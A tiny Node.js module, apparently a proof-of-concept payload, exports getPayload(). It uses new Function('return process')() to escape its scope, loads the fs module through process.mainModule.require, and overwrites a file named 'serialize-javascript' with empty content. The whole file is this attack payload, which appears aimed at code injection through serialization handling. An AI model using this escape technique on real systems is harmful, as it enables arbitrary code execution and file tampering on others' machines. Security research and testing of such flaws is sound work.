function getPayload(process) {
    return {
        str: 
            "string" + 
            (new Function('return process')().mainModule.require('fs')).writeFileSync('serialize-javascript', '')
    };
}

module.exports = { getPayload };